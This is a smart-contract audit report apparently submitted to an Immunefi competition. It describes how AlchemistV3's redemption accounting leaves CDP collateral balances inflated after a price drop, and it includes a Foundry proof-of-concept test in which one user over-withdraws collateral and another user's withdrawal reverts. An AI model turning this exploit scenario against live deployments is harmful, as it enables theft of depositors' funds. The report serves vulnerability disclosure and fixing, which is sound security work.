# 57585 sc high alchemistv3 does not properly update cdp collateralbalance when redemptions exceed totallocked which enables some cdps to over withdraw collateral on account of others

**Submitted on Oct 27th 2025 at 11:06:05 UTC by @niroh for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57585
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

AlchemistV3 implements a mechanism to distribute redemption collateral payments pro-rata beween CDPs. This mechanism can be described as follows:

1. Each CDP tracks its rawLocked amount, which, with each change in the CDP debt, gets added/removed the amount of collateral required to cover the added/removed debt with minimumCR (based on collateral price at the time the debt was added or removed).
2. A totalLocked state variable maintains a sum of the rawLocked for all CDPs in the system.
3. When collateral is paid out in redeem, the part of that collateral each CDP pays is tracked with the help of the \_collateralWeight accumulator that accumulates the ratio of collateral payment to totalLocked of each redeem(). When a CDP is synced, its share of collateral payments is calculated from the colateralWeight diff since last sync and its rawLocked. That share is then subtracted from the CDP collateralBalance.

```solidity
//FROM ALCHEMISTV3 Redeem

 // move only the net collateral + fee
uint256 collRedeemed  = convertDebtTokensToYield(amount);
uint256 feeCollateral = collRedeemed * protocolFee / BPS;
uint256 totalOut      = collRedeemed + feeCollateral;

// update locked collateral + collateral weight
uint256 old = _totalLocked;
_totalLocked = totalOut > old ? 0 : old - totalOut;
_collateralWeight += PositionDecay.WeightIncrement(totalOut > old ? old : totalOut, old);

```

## Vulnerability Details

The problem occurs in situations where a redeem() collateral payment exceeds totalLocked. Since rawLocked/totalLocked only accounts for minimumCR above debt **at the time the debt was added** (and does not update backwards), if collateral price decreases significantly, redeem payments may exceed totalLocked.

Note in the code snippet above, that in the case of the paid amount exceeding totalLocked, the collateralWeight is only updated up to totalLocked, meaning the amount of collateral paid above totalLocked is not reduced pro-rata from CDPs collateralBalance.

This creates a situation where the sum of all CDP.collateralBalance is below the actual collateral available in AlchemistV3. This is because each CDP holds a collateralBalance amount higher then they should actually have (and that the system can cover).

A CDP owner who is aware of this issue can track the system for such a scenario, and immediately (after burning any remaining debt they may have) redeem their inflated collateralBalance. This will enable them to withdraw more collateral than they should actually have, on account of other CDP holders who will not be able to withdraw even their fair share of collateral (ignoring the excessive part of their collateralBalance) because of the over-withdrawal of faster-to-act CDP owners. (see POC for example)

## Impact Details

Loss of funds (deposited collateral) for CDP owners who are last to withdraw in this scenario

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L632>

## Proof of Concept

## Proof of Concept

To run:

1. Copy the code below into the IntegrationTest contract is test/IntergrationTest.t.sol
2. Comment out the line `addDepositsToMYT();` in the setup() function (to enable simulating myt price drop )
3. Run with FOUNDRY\_PROFILE=default forge test --fork-url <https://mainnet.gateway.tenderly.co> --match-test testTotalLockedIssue -vvv --evm-version cancun

```solidity
function ClaimResdemptionTransmuter(address user) internal {
        vm.startPrank(user);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(transmuterLogic));
        transmuterLogic.claimRedemption(tokenId);
        vm.stopPrank();

    }

    function depositToAlchemix(uint256 shares, address user) internal {
        vm.startPrank(user);
        IERC20(address(vault)).approve(address(alchemist),shares);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        alchemist.deposit(shares,user, tokenId);
        
        vm.stopPrank();
    }

     function MintOnAlchemix(uint256 toMint, address user) internal {
         vm.startPrank(user);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        assertGt(tokenId,0,"cannot mint to user with no positions");
        alchemist.mint(tokenId, toMint, user);
        vm.stopPrank();
    }

    function RedeemOnTransmuter(address user, uint256 debtAmount) internal {
        vm.startPrank(user);

        IERC20(alUSD).approve(address(transmuterLogic), debtAmount);
        transmuterLogic.createRedemption(debtAmount);

        vm.stopPrank();

    }

    function moveTime(uint256 blocks) internal {
        vm.warp(block.timestamp+blocks*12);
        vm.roll(block.number+blocks);
    }

    function printCDPState(address user, string memory message) internal {
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
         //poke to refresh _earmark and sync
        alchemist.poke(tokenId);
        (uint256 collateral, uint256 debt, uint256 earmarked) = alchemist.getCDP(tokenId);
        uint256 collateralInDebt = alchemist.convertYieldTokensToDebt(collateral);
        console.log("%s",message);
        console.log("collateral: %s", collateral/1e18);
        console.log("collateral in debt tokens: %s", collateralInDebt/1e18);
        console.log("debt %s", debt/1e18);
        console.log("earmarked %s\n\n",earmarked/1e18);
    }

    function printState(string memory message) internal {
    
   
        uint256 totalDebt = alchemist.totalDebt();
        uint256 synthIssued = alchemist.totalSyntheticsIssued();
        uint256 transmuterCollBalance = IERC20(address(alchemist.myt())).balanceOf(address(transmuterLogic));
        uint256 transmuterDebtCoverage = alchemist.convertYieldTokensToDebt(transmuterCollBalance);
        uint256 transmuterLocked = transmuterLogic.totalLocked();
        
        
        uint256 alchemistCollBalance = IERC20(address(alchemist.myt())).balanceOf(address(alchemist));
        uint256 alchemistCollInDebt = alchemist.convertYieldTokensToDebt(alchemistCollBalance);
        console.log("%s",message);
        console.log("Alchemist Total Debt: %s",totalDebt/1e18);
        console.log("Alchemist cumulative earmarked: %s", alchemist.cumulativeEarmarked() / 1e18);
        console.log("Alchemist getTotalUnderlyingValue (_mytSharesDeposited value in debt tokens)", alchemist.getTotalUnderlyingValue()/1e6);
        console.log("Alchemist Actual Collateral balance value in debt tokens", alchemistCollInDebt / 1e18);
        console.log("Transmuter Debt Coverage (collateral balance value in debt tokens): %s",transmuterDebtCoverage/1e18);
        console.log("Transmuter Locked Synthetic tokens: %s",transmuterLocked/1e18);
        console.log("Total Synthetic token Issuance: %s\n\n",synthIssued/1e18);
    }

     function withdrawFromAlchemist(address user, uint256 amount) internal {
        vm.startPrank(user);
         uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        alchemist.withdraw(amount,user, tokenId);
        vm.stopPrank();
    }

    function simulateMytPriceDrop(uint256 dropPercent) public {
        uint256 mytVaultUnderlyingBalance  = IERC20(USDC).balanceOf(address(vault));
        vm.prank(address(vault));
        IERC20(USDC).transfer(address(this), mytVaultUnderlyingBalance * dropPercent / 100);
        uint256 sharePrice = VaultV2(vault).convertToAssets(1e18);
        console.log("updated myt share price (underlying tokens per 1e18 myt): %s\n",sharePrice);
    }

    function testTotalLockedIssue() public {
        address bob = makeAddr("bob");
        address alice = makeAddr("alice");
        address redeemer1 = makeAddr("redeemer1");

        //deposits to vault
         uint256 sharesBob = _magicDepositToVault(address(vault), bob, 6000e6);
         vm.prank(bob);
         vault.transfer(alice,sharesBob/2);
         


        //bob and alice deposit 1200 vault shares to alchemix each
        uint256 depositedCollateral = 1200e18;
        depositToAlchemix(depositedCollateral, bob);
        depositToAlchemix(depositedCollateral, alice);

        //bob and alice mint a debt of 1000 each
        uint256 mintAmount = 1000e18;
        MintOnAlchemix(mintAmount,bob);
        MintOnAlchemix(mintAmount,alice);
        uint256 tokenIdBob = AlchemistNFTHelper.getFirstTokenId(bob, address(alchemistNFT));
        uint256 tokenIdAlice = AlchemistNFTHelper.getFirstTokenId(alice, address(alchemistNFT));

        //transfers to redeemer
        vm.prank(bob);
        IERC20(alUSD).transfer(redeemer1, mintAmount);

        vm.prank(alice);
        IERC20(alUSD).transfer(redeemer1, mintAmount);

        //create and vest redemption
        RedeemOnTransmuter(redeemer1, IERC20(alchemist.debtToken()).balanceOf(redeemer1));
        moveTime(transmuterLogic.timeToTransmute());

        //emulate 12% myt share price drop
        simulateMytPriceDrop(12);

        //claim Redemption
        ClaimResdemptionTransmuter(redeemer1);

        printCDPState(bob, "bob CDP After price drop and redemption");
        printCDPState(bob, "alice CDP After price drop and redemptio");
        printState("system State After CDP After price drop and redemptio");
        /*
        OUTPUT:
        bob CDP After Redemption
        collateral: 88
        collateral in debt tokens: 78
        debt 0
        earmarked 0


        alice CDP After Redemption
        collateral: 88
        collateral in debt tokens: 78
        debt 0
        earmarked 0


        system State After Redemption
        Alchemist Total Debt: 0
        Alchemist cumulative earmarked: 0
        Alchemist getTotalUnderlyingValue (_mytSharesDeposited value in debt tokens) 92
        Alchemist Actual Collateral balance value in debt tokens 92
        Transmuter Debt Coverage (collateral balance value in debt tokens): 0
        Transmuter Locked Synthetic tokens: 0
        Total Synthetic token Issuance: 0

        Note that both bob and alice have a colateralBalance of 78 (in debt tokens) but the total
        alchemist collateral is only worth 92 debt tokens - not enough for both bob and alice to withdraw fully.
        This is because the price drop caused the redemption payment to go above totalLocked and therefore
        some of it was not accounted for in the collateralWeight/cdp collateralBalance.
        */

        //bob sees the situation and is quick to withdraw his full (inflated) collateral balance
       uint256 bobCollBefore = vault.balanceOf(bob);
        (uint256 collateral,,) = alchemist.getCDP(tokenIdBob);
        withdrawFromAlchemist(bob, collateral);
        uint256 bobCollDiff = vault.balanceOf(bob) - bobCollBefore;
        console.log("bob withdrew %s collateral.",bobCollDiff);
        printCDPState(bob, "bob CDP After bob withdraws");
        printCDPState(bob, "alice CDP After bob withdraws");
        printState("system State After bob withdraws");


         //alice tries to withdraw her entire collateral balance (should work because her CDP debt is 0)
         //The withdrawal reverts because Alchemist remaining collateral (in debt tokens) is 13, 
         //not enough collateral to cover alice.
        (collateral,,) = alchemist.getCDP(tokenIdAlice);
        vm.startPrank(alice);
        vm.expectRevert();
        alchemist.withdraw(collateral,alice, tokenIdAlice);
        vm.stopPrank();
    }

     //POC END
    ///////////////////////////////////////////////////////////////////////////////////
```
